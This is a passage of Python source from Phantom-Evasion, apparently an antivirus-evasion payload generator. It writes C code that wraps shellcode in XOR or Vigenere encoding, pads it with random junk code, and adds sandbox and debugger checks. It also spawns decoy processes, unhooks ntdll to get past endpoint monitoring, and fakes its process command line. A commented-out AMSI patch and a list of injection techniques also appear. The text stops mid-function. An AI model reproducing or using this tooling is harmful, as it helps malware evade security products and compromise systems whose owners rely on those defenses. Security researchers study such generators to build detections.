
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################


import random, string
import sys
sys.path.append("Modules/payloads/encryption")
sys.dont_write_bytecode = True
from Crypthelper import Printable
from platform import python_version

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

Remote_methods = ["ThreadExecutionHijack","TEH","Processinject","PI","EarlyBird","EB","EntryPointHijack","EPH","APCSpray","APCS"]

def readpayload_exfile():

    Payload = ""
    payload_file = open("payload.txt","r")
    for line in payload_file:
        Payload += line

    return Payload

def SplitStr(st): 
    return [char for char in st]
    

def EncryptionManager(Encryption,Payload,Randbufname,Randlpv=""):

    if Encryption == "1":
        
       Payload = (Payload,"False")

    if Encryption == "2":
        
        from Multibyte_xor import XorEncrypt

        Payload = XorEncrypt(Payload,Randbufname,Randlpv)

    elif Encryption == "3":

        from Multibyte_xor import DoubleKeyXorEncrypt

        Payload = DoubleKeyXorEncrypt(Payload,Randbufname,Randlpv) 

    elif Encryption == "4": 

        from Vigenere import VigenereEncrypt

        Payload = VigenereEncrypt(Payload,Randbufname,Randlpv) 

    elif Encryption == "5":

        from Vigenere import DoubleKeyVigenereEncrypt

        Payload = DoubleKeyVigenereEncrypt(Payload,Randbufname,Randlpv)

    return Payload

def CryptFile(ModOpt):

    if ModOpt["cryptFile"] != False:

        filetocrypt=open(ModOpt["cryptFile"],'rb')
        filebuff=filetocrypt.read()

        filebuff_ready = Printable(filebuff)
  
        DecodeKit = EncryptionManager(ModOpt["Encode"],filebuff_ready,ModOpt["Lpvoid"] + "*$#FILE*")
        Payload = DecodeKit[0]     # encoded file 
        ModOpt["Decoder"] = DecodeKit[1] # decoder stub or string = False if decoder is not necessary

        with open(ModOpt["cryptFile"].replace(".","crypt."),'wb') as f:

            if python_version()[0] == "3":

                f.write(Payload.encode('latin-1').decode('unicode-escape').encode('latin-1'))
            else:
                f.write(Payload.decode('string-escape'))

            f.close()

    else:

        ModOpt["Decoder"] = "False"

def IncludeShuffler(Include_List):
    
    include = ""
    random.shuffle(Include_List)

    for i in range(0,len(Include_List)):

        include += Include_List[i]

    return include


def WriteSource(fname,code):

    f = open(fname,'wb')
    f.write(code.encode('utf-8'))
    f.close()

def powershell_adjust(powershell_var):
    ret_powershell=""
    powershell_var=powershell_var.splitlines()
    for line in powershell_var:
        if line != "\n" and line != "":
            line= '"' + line.replace('"','\\"') + '\\n"\n'
            ret_powershell += line
    return ret_powershell


def Checksum8(Uri):

    sum = 0

    for i in Uri:

        sum += ord(i)

    return sum % 256 


def UriGenerator(length=random.randint(32,128)):

    while(True):

        uri = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + "-_") for _ in range(length))

        if Checksum8(uri) == 92:

            return uri

def JunkInjector(Source,JIntensity,JFrequency,EFrequency,Reinject):

    NewSource = ""
    Source = Source.splitlines()

    if JIntensity <= 0:
       JIntensity = 1

    elif JIntensity > 100:
       JIntensity = 100

    if JFrequency < 0:
       JFrequency = 0

    elif JFrequency > 100:
       JFrequency = 100

    if EFrequency < 0:
       EFrequency = 0

    elif EFrequency > 10:
       EFrequency = 10

    if Reinject < 0:
        Reinject = 0

    elif Reinject > 90:
        Reinject = 90

    for i in range(0,len(Source)):

        if "$:START" in Source[i]:

            Source[i]=Source[i].replace("$:START","")
            start=i

        elif "$:END" in Source[i]:

            Source[i]=Source[i].replace("$:END","")
            end=i

        elif "$:EVA" in Source[i]:

            evasioncode = ""
            Etemp=EFrequency
            while (Etemp > 0):

                evasioncode+=WindowsEvasion()
                Etemp-=1

            Source[i]=evasioncode

    mult = 1

    while JFrequency >= end - start:

        JFrequency=int(JFrequency/2)
        mult*=2

    position=sorted(random.sample(range(start,end),JFrequency))
    ii=0

    for i in range(0,len(Source)):

        NewSource += Source[i] + "\n"

        if position[ii] == i:

            x = mult
            temp1=""

            while x > 0:

                temp1+=JunkcodeGenerator(JIntensity)
                x-=1

            if Reinject > 0:
                        
                temp2 = ""
                Junklist=temp1.splitlines()

                for junkline in Junklist:

                    temp2 += junkline + "\n"

                    while(Reinject < random.randint(1,100)):

                        temp2 += JunkcodeGenerator(random.randint(2,6))

                NewSource += temp2

            else:

                NewSource += temp1

            if ii < len(position) - 1:
     
                ii+=1

    NewSource += "}" * EFrequency

    return NewSource

def WindowsEvasion():

    Evasion_code = ""
    number = random.randint(1,14)

    if number == 1:    # open process trick
        Randfilehandle = varname_creator()
        Randprochandle = varname_creator()
        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += Randprochandle + " = OpenProcess( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == 2:  # check time distortion 1
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        dyn_loadGTC = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "Sleep(" + Randsleep + ");\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == 3: # Create a non-signaled Event time attack
        RandEvent = varname_creator()
        RandWaitsob = varname_creator() 
        Randsleep = str(random.randint(1000,1600))
        Evasion_code += "HANDLE " + RandEvent + " = CreateEvent(NULL, TRUE, FALSE, NULL);"
        Evasion_code += "if (" + RandEvent + " != NULL){\n"
        Evasion_code += "DWORD " + RandWaitsob + " = WaitForSingleObject(" + RandEvent + "," + Randsleep + ");\n"



    elif number == 4: # dynamic big mem alloc then zero-out
        Ndcvirtual = varname_creator()
        Randptr = varname_creator()
        Randbytesnumb = str(random.randrange(10000000,90000000,1024))
        
        Evasion_code += "LPVOID " + Randptr + " = NULL ;\n"
        Evasion_code += "FARPROC " + Ndcvirtual + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAlloc\");\n"
        Evasion_code += Randptr + " = (LPVOID)" + Ndcvirtual + "(NULL," + Randbytesnumb + ",0x3000,0x40);\n"
        Evasion_code += "if(" + Randptr + "!= NULL){\n"
        Evasion_code += "SecureZeroMemory(" + Randptr + "," + Randbytesnumb + ");\n"
        Evasion_code += "VirtualFree(" + Randptr + ", 0 , 0x8000);\n"


    elif number == 5: # load fake dll

        Ker32 = varname_creator()
        Fakedllname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(12,16)))
        
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(TEXT(\"" + Fakedllname + ".dll\"));\n"
        Evasion_code += "if(" + Ker32 + " == NULL){\n"


    elif number == 6: # SetErrorMode trick

        dwCode = varname_creator()
        error_numb = str(random.randint(1000,2000))
        
        Evasion_code += "DWORD " + dwCode + ";\n"
        Evasion_code += "SetErrorMode(" + error_numb + ");\n"
        Evasion_code += "if(SetErrorMode(0) == " + error_numb + "){SetErrorMode(0);\n"

    if number == 7: # dynamic open process trick
        dyn_loadOP = varname_creator()
        Randprochandle = varname_creator()

        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += "FARPROC " + dyn_loadOP + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"OpenProcess\");\n"
        Evasion_code += Randprochandle + " = (HANDLE)" + dyn_loadOP + "( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == 8: # dynamic WTF is numa?
        dyn_loadVAEX = varname_creator()
        memvar = varname_creator()
        
        Evasion_code += "LPVOID " + memvar + " = NULL;\n"
        Evasion_code += "FARPROC " + dyn_loadVAEX + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAllocExNuma\");\n"
        Evasion_code += memvar + " = (LPVOID)" + dyn_loadVAEX + "(GetCurrentProcess(),NULL," + str(random.randint(600,1200)) + ",0x00001000|0x00002000,0x40,0);\n"
        Evasion_code += "if(" + memvar + " != NULL){\n"


    elif number == 9: # dynamic WTF is fls?
        dyn_loadFLSA = varname_creator()
        resvar = varname_creator()
        

        Evasion_code += "FARPROC " + dyn_loadFLSA + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"FlsAlloc\");\n"
        Evasion_code += "DWORD " + resvar + " = (DWORD)" + dyn_loadFLSA + "(NULL);\n"
        Evasion_code += "if(" + resvar + " != FLS_OUT_OF_INDEXES){\n"
 

    elif number == 10: # Dynamic CheckRemoteDebuggerPresent

        dyn_loadCRDP = varname_creator()
        Randbool = varname_creator()
        Evasion_code += "BOOL " + Randbool + " = FALSE;\n"
        Evasion_code += "FARPROC " + dyn_loadCRDP + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"CheckRemoteDebuggerPresent\");\n"
        Evasion_code += dyn_loadCRDP + "(GetCurrentProcess(), &" + Randbool + ");\n"
        Evasion_code += "if(" + Randbool + " != TRUE){\n"

    elif number == 11: # Dynamic2 WTF is numa?
        dyn_loadVAEX = varname_creator()
        Ker32 = varname_creator()
        memvar = varname_creator()
        
        Evasion_code += "LPVOID " + memvar + " = NULL;\n"
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
        Evasion_code += "if(" + Ker32 + " != NULL){\n"
        Evasion_code += "FARPROC " + dyn_loadVAEX + " = GetProcAddress(" + Ker32 + ", \"VirtualAllocExNuma\");\n"
        Evasion_code += memvar + " = (LPVOID)" + dyn_loadVAEX + "(GetCurrentProcess(),NULL," + str(random.randint(600,1200)) + ",0x00001000|0x00002000,0x40,0);}\n"
        Evasion_code += "if(" + memvar + " != NULL){\n"

    elif number == 12: # dyn check time distortion 2 
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        Rand_delayms = varname_creator()
        dyn_loadGTC = varname_creator()
        dyn_loadSE = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "const DWORD " + Rand_delayms + " = " + Randsleep + ";\n"
        Evasion_code += "FARPROC " + dyn_loadSE + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"SleepEx\");\n" 
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += dyn_loadSE + "(" + Rand_delayms + ",FALSE);\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == 13: # dynamic2 WTF is fls?
        dyn_loadFLSA = varname_creator()
        Ker32 = varname_creator()
        resvar = varname_creator()
        
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
        Evasion_code += "DWORD " + resvar + ";\n"
        Evasion_code += "if(" + Ker32 + " != NULL){\n"
        Evasion_code += "FARPROC " + dyn_loadFLSA + " = GetProcAddress(" + Ker32 + ", \"FlsAlloc\");\n"
        Evasion_code += resvar + " = (DWORD)" + dyn_loadFLSA + "(NULL);}\n"
        Evasion_code += "if(" + resvar + " != FLS_OUT_OF_INDEXES){\n"


    elif number == 14: # dyn check time distortion 1 
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        dyn_loadGTC = varname_creator()
        Rand_delayms = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "const DWORD " + Rand_delayms + " = " + Randsleep + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "SleepEx(" + Rand_delayms + ",FALSE);\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == 15: # Post Thread Message

        Randmsg = varname_creator()
        Randtc = varname_creator()
        Evasion_code += "MSG " + Randmsg + ";\n"
        Evasion_code += "DWORD " + Randtc + ";\n"
        Evasion_code += "PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);\n"
        Evasion_code += "if(PeekMessage(&" + Randmsg + ", (HWND)-1, 0, 0, 0)){\n"
        Evasion_code += "if (" + Randmsg + ".message != WM_USER+2 || " + Randmsg + ".wParam != 23 || " + Randmsg + ".lParam != 42){return;}\n"


    return Evasion_code

def WindowsDecoyProc(number):

    Evasion_code = ""

    for line in range(0,number):

        number = random.randint(1,3)

        if number == 1: # CreateMutex/WinExec 1

            mutexvar = varname_creator()
            mutexname = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "WinExec(argv[0],0);Sleep(" + Randtime + ");}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"


        elif number == 2: # CreateMutex/WinExec 2

            mutexvar = varname_creator()
            mutexname = varname_creator()
            dyn_loadWE = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "FARPROC " + dyn_loadWE + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"WinExec\");\n" 
            Evasion_code += dyn_loadWE + "(argv[0],0);Sleep(" + Randtime + ");}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"


        elif number == 3: # CreateMutex/CreateProcess 1
            Mutexvar = varname_creator()
            Mutexname = varname_creator()
            Randsi = varname_creator()
            Randpi = varname_creator()
            Randtime = str(random.randint(40000,80000)) 
            Evasion_code += "HANDLE " + Mutexvar + ";\n"
            Evasion_code += "CreateMutex(NULL, TRUE,\"" + Mutexname + "\");\n"
            Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
            Evasion_code += "STARTUPINFO " + Randsi + ";PROCESS_INFORMATION " + Randpi + ";\n"
            Evasion_code += "ZeroMemory(&" + Randsi + ", sizeof(" + Randsi + "));\n"
            Evasion_code += "ZeroMemory(&" + Randpi + ", sizeof(" + Randpi + "));\n"
            Evasion_code += "CreateProcess(argv[0],NULL,NULL,NULL,FALSE,0,NULL,NULL,&" + Randsi + ",&" + Randpi + ");SleepEx(" + Randtime + ",FALSE);}\n"
            Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"

    return Evasion_code

def CheckForBackslash(string2check):
    return string2check.replace("\\","\\\\")

def CloseDecoyProc(number):
    brack= "}" * number
    return brack

def InjectMessageBox(text):
    Winjunk_code = ""

    if number == "1":

        msgtype= MBtype()

        Winjunk_code += "MessageBox(NULL,\"Failed\",NULL," + msgtype + ");\n"

    if number == "2":
        User32 = varname_creator()
        dyn_loadMB = varname_creator()
        msgtype= MBtype()

        Winjunk_code += "HINSTANCE " + User32 + " = LoadLibrary(\"User32.dll\");\n"
        Winjunk_code += "if(" + User32 + " != NULL){\n"
        Winjunk_code += "FARPROC " + dyn_loadMB + " = GetProcAddress(" + User32 + ", \"MessageBox\");\n"
        Winjunk_code += dyn_loadMB +"(NULL,\"Failed\",NULL," + msgtype + ");}\n"

    if number == "3":

        dyn_loadMB = varname_creator()
        msgtype= MBtype()

        Winjunk_code += "FARPROC " + dyn_loadMB + " = GetProcAddress(GetModuleHandle(\"User32.dll\"), \"MessageBox\");\n" 
        Winjunk_code += dyn_loadMB +"(NULL,\"Failed\",NULL," + msgtype + ");\n"

    return Winjunk_code


def MBtype():
    msgtype=""
    msgrandomtype = random.randint(1,3)
    if msgrandomtype == 1:
        msgtype="MB_ABORTRETRYIGNORE"
    if msgrandomtype == 2:
        msgtype="MB_CANCELTRYCONTINUE"
    if msgrandomtype == 3:
        msgtype="MB_OKCANCEL"  
    return msgtype

def WindowsDefend(ModOpt):

    Ret_code = ""

    #if ModOpt["AmsiBypass1"] == True:

    #    AmsiDll = varname_creator()
    #    AmsiScanBufferPtr = varname_creator()
    #    OldProt = varname_creator()
    #    Patch = varname_creator()

    #    Ret_code += "HINSTANCE " + AmsiDll + " = LoadLibrary(\"amsi.dll\");\n"
    #    Ret_code += "UINT_PTR " + AmsiScanBufferPtr + " = GetProcAddress(" + AmsiDll + ",\"AmsiScanBuffer\");\n"
    #    Ret_code += "if(" + AmsiScanBufferPtr + " != NULL){\n"
    #    #Ret_code += "UIntPtr dwSize = (UIntPtr)5;
    #    Ret_code += "DWORD " + OldProt + " = 0;\n"
    #    Ret_code += "if (VirtualProtect(" + AmsiScanBufferPtr + ",5,0x04," + OldProt + ")){\n"
    #    Ret_code += "unsigned char " + Patch + "[] = { 0x31, 0xff, 0x90 };\n"
    #    Ret_code += "RtlMoveMemory(" + AmsiScanBufferPtr + " + 0x001b," + Patch + ",3);\n"
    #    Ret_code += "VirtualProtect(" + AmsiScanBufferPtr + ",5," + OldProt + "," + OldProt + ");}}\n"


    if ModOpt["UnhookNtdll"] == True:
        
        NdcGMI = varname_creator()
        RandModInfo = varname_creator()
        RandNtdllBase = varname_creator()
        RandNtdllFile = varname_creator()
        RandNtdllModule = varname_creator()
        RandNtdllMapping = varname_creator()
        RandNtdllMapAddr = varname_creator()
        RandDosHeader = varname_creator()
        RandNtHeader = varname_creator()
        RandSectHeader = varname_creator()
        Randflag = varname_creator()
        OldProt = varname_creator()

        Ret_code += "typedef struct _MODULEINFO {"
        Ret_code += "LPVOID lpBaseOfDll;"
        Ret_code += "DWORD  SizeOfImage;"
        Ret_code += "LPVOID EntryPoint;"
        Ret_code += "} MODULEINFO, *LPMODULEINFO;\n" 

        Ret_code += "MODULEINFO " + RandModInfo + ";\n"
        Ret_code += "HMODULE " + RandNtdllModule + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "FARPROC " + NdcGMI + " = GetProcAddress(LoadLibrary(\"psapi.dll\"),\"GetModuleInformation\");\n"
        Ret_code += "if(!" + NdcGMI + "){\n"
        Ret_code += NdcGMI + " = GetProcAddress(LoadLibrary(\"kernel32.dll\"),\"GetModuleInformation\");}\n"
        Ret_code += "if(" + NdcGMI + "){\n"
        Ret_code += NdcGMI + "(GetCurrentProcess()," + RandNtdllModule + ", &" + RandModInfo + ", sizeof(" + RandModInfo + "));\n"
        Ret_code += "LPVOID " + RandNtdllBase + " = (LPVOID)" + RandModInfo + ".lpBaseOfDll;\n"
        Ret_code += "HANDLE " + RandNtdllFile + " = CreateFileA(\"c:\\\\windows\\\\system32\\\\ntdll.dll\", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n"
        Ret_code += "HANDLE " + RandNtdllMapping + " = CreateFileMapping(" + RandNtdllFile + ", NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);\n"
        Ret_code += "LPVOID " + RandNtdllMapAddr + " = MapViewOfFile(" + RandNtdllMapping + ", FILE_MAP_READ, 0, 0, 0);\n"
        Ret_code += "PIMAGE_DOS_HEADER " + RandDosHeader + " = (PIMAGE_DOS_HEADER)" + RandNtdllBase + ";\n"
        Ret_code += "PIMAGE_NT_HEADERS " + RandNtHeader + " = (PIMAGE_NT_HEADERS)((DWORD_PTR)" + RandNtdllBase + " + " + RandDosHeader + "->e_lfanew);\n"
        Ret_code += "for (WORD " + Randflag + " = 0;" + Randflag + " < " + RandNtHeader + "->FileHeader.NumberOfSections;" + Randflag + "++) {\n"
        Ret_code += "PIMAGE_SECTION_HEADER " + RandSectHeader + " = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(" + RandNtHeader + ") + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * " + Randflag + "));\n"        
        Ret_code += "if (!strcmp((char*)" + RandSectHeader + "->Name, (char*)\".text\")){\n"
        Ret_code += "DWORD " + OldProt + " = 0;\n"
        Ret_code += "VirtualProtect((LPVOID)((DWORD_PTR)" + RandNtdllBase + " + (DWORD_PTR)" + RandSectHeader + "->VirtualAddress), " + RandSectHeader + "->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &" + OldProt + ");\n"
        Ret_code += "memcpy((LPVOID)((DWORD_PTR)" + RandNtdllBase + " + (DWORD_PTR)" + RandSectHeader + "->VirtualAddress), (LPVOID)((DWORD_PTR)" + RandNtdllMapAddr + " + (DWORD_PTR)" + RandSectHeader + "->VirtualAddress)," + RandSectHeader + "->Misc.VirtualSize);\n"
        Ret_code += "VirtualProtect((LPVOID)((DWORD_PTR)" + RandNtdllBase + " + (DWORD_PTR)" + RandSectHeader + "->VirtualAddress), " + RandSectHeader + "->Misc.VirtualSize," + OldProt + ",&" + OldProt + ");}}}\n"

    if ModOpt["PEBmasquerade"] == True:

        #include "stdafx.h"
        #include "Windows.h"
        #include "winternl.h"
        NdcNTQIP = varname_creator()
        RandProcInfo = varname_creator()
        RandVarlenght = varname_creator()
        RandProcparam = varname_creator()

        if ModOpt["DynImport"] == False and "NtdllHandle" not in ModOpt :

            ModOpt["NtdllHandle"] = varname_creator()

            Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"

        if "PBIdefined" not in ModOpt or ModOpt["PBIdefined"] == False:

            Ret_code += "typedef struct _PROCESS_BASIC_INFORMATION {"
            Ret_code += "PVOID Reserved1;"
            Ret_code += "SIZE_T PebBaseAddress;"
            Ret_code += "PVOID Reserved2[2];"
            Ret_code += "ULONG_PTR UniqueProcessId;"
            Ret_code += "PVOID Reserved3;"
            Ret_code += "} PROCESS_BASIC_INFORMATION;\n"

        Ret_code += "typedef struct _UNICODE_STR{"
        Ret_code += "  USHORT Length;"
        Ret_code += "  USHORT MaximumLength;"
        Ret_code += "  PWSTR pBuffer;"
        Ret_code += "} UNICODE_STR, *PUNICODE_STR;\n"


        Ret_code += "typedef struct _PEB_LDR_DATA {"
        Ret_code += "BYTE Reserved1[8];"
        Ret_code += "PVOID Reserved2[3];"
        Ret_code += "LIST_ENTRY InMemoryOrderModuleList;"
        Ret_code += "} PEB_LDR_DATA, *PPEB_LDR_DATA;\n"

        Ret_code += "typedef struct _RTL_USER_PROCESS_PARAMETERS {"
        Ret_code += "BYTE Reserved1[16];"
        Ret_code += "PVOID Reserved2[10];"
        Ret_code += "UNICODE_STR ImagePathName;"
        Ret_code += "UNICODE_STR CommandLine;"
        Ret_code += "} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;\n"


        #Ret_code += "typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);"
        Ret_code += "PROCESS_BASIC_INFORMATION " + RandProcInfo + ";\n"
        Ret_code += "ULONG " + RandVarlenght + " = 0;\n"
        Ret_code += "FARPROC " + NdcNTQIP + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ",\"NtQueryInformationProcess\");\n"
        Ret_code += NdcNTQIP + "(GetCurrentProcess(),0, &" + RandProcInfo + ", sizeof(" + RandProcInfo + "), &" + RandVarlenght + ");\n"

        Ret_code += "PRTL_USER_PROCESS_PARAMETERS " + RandProcparam + " = (PRTL_USER_PROCESS_PARAMETERS)(" + RandProcInfo + ".PebBaseAddress+12+sizeof(PEB_LDR_DATA));\n"
        Ret_code += RandProcparam + "->CommandLine.pBuffer = L\"" + ModOpt["Masqcmdline"] + "\";\n"
        Ret_code += RandProcparam + "->ImagePathName.pBuffer = L\"" + ModOpt["Masqpath"] + "\";\n"

    return Ret_code


def JunkcodeGenerator(H):

    number = random.randint(1,59)

    Junkcode = ""

    if number == 1: #sum firs n integer 1 
        Randcounter = varname_creator()
        Randcounter2 = varname_creator()
        Randcounter3 = varname_creator()
        Randbignumb = str(random.randint(10*H,99*H))
        Junkcode += "int " + Randcounter + "," + Randcounter2 + ";\n"
        Junkcode += "unsigned long long int " + Randcounter3 + " = 0;\n"
        Junkcode += Randcounter2 + " = " + Randbignumb + ";\n"
        Junkcode += "for (" + Randcounter + " = 1;" + Randcounter + " <= " + Randcounter2 + "; " + Randcounter + "++){\n"
        Junkcode += Randcounter3 + " = " + Randcounter3 + "+" + Randcounter + ";}\n"

    if number == 2: #sum firs n integer 2 
        Randcounter = varname_creator()
        Randcounter2 = varname_creator()
        Randcounter3 = varname_creator()
        Randbignumb = str(random.randint(10*H,99*H))
        Junkcode += "int " + Randcounter + ";\n"
        Junkcode += "unsigned long long int " + Randcounter2 + " = 0;\n"
        Junkcode += Randcounter + " = " + Randbignumb + ";\n"
        Junkcode += "while(" + Randcounter + " > 0){\n"
        Junkcode += Randcounter2 + " = " + Randcounter2 + "+" + Randcounter + ";\n"
        Junkcode += Randcounter + " = " + Randcounter + " - 1;}\n"


    elif number == 3: #fibonacci numbers in range (1,N)

        Rand1=varname_creator()
        Rand2=varname_creator()
        Rand3=varname_creator()
        Rand4=varname_creator()
        Rand5=varname_creator()
        Randbignumb = str(random.randint(10*H,99*H))

        Junkcode += "int " + Rand1 + " = 0," + Rand2 + " = 1," + Rand3 + "," + Rand4 + "," + Rand5 + " = 0;\n"
        Junkcode += Rand4 + " = " + Randbignumb + ";\n"
        Junkcode += "while (" + Rand5 + " < " + Rand4 + "){\n"
        Junkcode += Rand3 + " = " + Rand1 + " + " + Rand2 + ";\n" + Rand5 + "++;\n"
        Junkcode += Rand1 + "=" + Rand2 + ";\n" + Rand2 + " = " + Rand3 + ";}\n"
 

    elif number == 4: # Twin tower

        Randbig1 = str(random.randrange(10*H,99*H,10))
        Randbig2 = str(random.randrange(10*H,77*H,10))
        Randcpt= varname_creator()
        Randcpt2= varname_creator()
        Randi = varname_creator()
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig2 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt2 + "){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;\n"
        Junkcode += "}else{\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;}}\n"

    elif number == 5: #BacktoZero

        Randbig1 = str(random.randrange(10*H,99*H,10))
        Randcpt= varname_creator()

        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"


    elif number == 6: # Randmatrix 1 

        Randi = str(random.randint(1*H,9*H))
        Randj = str(random.randint(1*H,9*H))
        Randmatr= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % " + str(random.randint(100,9999)) + ";\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randtot + " = " + Randtot + " + " + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");\n"

    elif number == 7: # Randmatrix 2

        Randi = str(random.randint(1*H,9*H))
        Randj = str(random.randint(1*H,9*H))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

